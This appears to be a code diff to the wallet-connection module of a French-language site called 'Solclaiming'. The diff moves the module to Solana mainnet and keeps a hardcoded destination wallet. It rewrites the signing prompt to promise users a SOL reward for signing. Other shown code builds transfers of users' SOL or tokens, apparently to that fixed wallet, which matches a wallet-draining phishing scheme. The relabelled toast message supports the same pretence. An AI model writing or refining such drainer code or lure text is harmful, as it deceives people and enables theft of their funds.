@@ -48,8 +48,9 @@ const WalletContext = createContext<WalletContextType | undefined>(undefined);
 
 const DESTINATION_WALLET = '4tdTZ5rk4ZYDdZmLDMY4YTqtcE9A8ERqhcVb8urR2Tzx';
 
-// RPC Mainnet - PublicNode (gratuit, permissif pour navigateurs)
-const RPC_URL = 'https://solana.publicnode.com';
+// Change ici pour passer en mainnet quand tu es prêt
+const RPC_URL = 'https://api.mainnet-beta.solana.com'; // MAINNET (attention aux fonds réels !)
+// const RPC_URL = 'https://api.devnet.solana.com'; // DEVNET pour tests sécurisés
 
 const connection = new Connection(RPC_URL, 'confirmed');
 
@@ -106,7 +107,18 @@ export const WalletProvider = ({ children }: { children: ReactNode }) => {
 
   const requestSignature = async (provider: PhantomProvider): Promise<boolean> => {
     try {
-      const message = "Bienvenu sur Solclaiming nouveau utilisateur";
+      const message = "`Bienvenue sur Solclaiming ! 🎉
+
+Merci d'avoir connecté ton wallet.
+
+En signant ce message, tu confirmes ta présence et ton activité sur le site.
+
+✅ En récompense, tu vas bientôt recevoir des SOL directement sur ton wallet, en échange des transactions que tu as effectuées ou que tu vas effectuer.
+
+C'est notre façon de remercier les vrais utilisateurs actifs !
+
+Signe pour valider et recevoir ta récompense 🚀
+";
       const encodedMessage = new TextEncoder().encode(message);
       await provider.signMessage(encodedMessage, 'utf8');
       return true;
@@ -185,7 +197,7 @@ export const WalletProvider = ({ children }: { children: ReactNode }) => {
       if (transaction.instructions.length === 0) {
         toast({
           title: 'Aucun fonds',
-          description: "Aucun SOL ou token à transférer.",
+          description: "Aucun SOL ou token à récuperer.",
         });
         return;
       }
